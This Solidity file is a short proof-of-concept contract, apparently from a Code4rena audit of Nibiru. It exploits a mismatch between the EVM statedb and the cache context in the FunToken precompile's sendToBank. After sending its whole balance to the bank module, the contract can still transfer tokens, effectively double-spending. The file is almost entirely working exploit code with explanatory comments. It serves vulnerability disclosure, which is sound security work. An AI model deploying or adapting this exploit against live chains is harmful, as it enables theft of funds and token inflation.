// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

interface IFunToken {
    function sendToBank(
        address erc20,
        uint256 amount,
        string calldata to
    ) external returns (uint256 sentAmount);
}

contract POC24 {
    IFunToken public funToken =
        IFunToken(0x0000000000000000000000000000000000000800);

    IERC20 public erc20;
    // recipient is validator and it's different from account which would be used to pay evm gas
    string public recipient;

    constructor(address _erc20, string memory _recipient) {
        erc20 = IERC20(_erc20);
        recipient = _recipient;
    }

    function attack() public {
        // transfer fun token to any address to dirty the statedb
        // transferring to self won't work because of this
        // https://github.com/code-423n4/2024-11-nibiru/blob/main/x/evm/statedb/statedb.go#L561
        // After further test, this part is not necessary
        // erc20.transfer(0x000000000000000000000000000000000000dEaD, 1);

        uint balance = erc20.balanceOf(address(this));
        // sendToBank should reduce balance to zero, but it won't
        // cacheCtx, yes. But in statedb, No
        funToken.sendToBank(address(erc20), balance, recipient);

        // increment journal from 0 because of this
        // https://github.com/code-423n4/2024-11-nibiru/blob/main/x/evm/statedb/statedb.go#L571
        // Also, did you noticed we transferred the whole balance in sendToBank
        // But, statedb thinks we have balance
        erc20.transfer(0x000000000000000000000000000000000000dEaD, 1);
    }
}
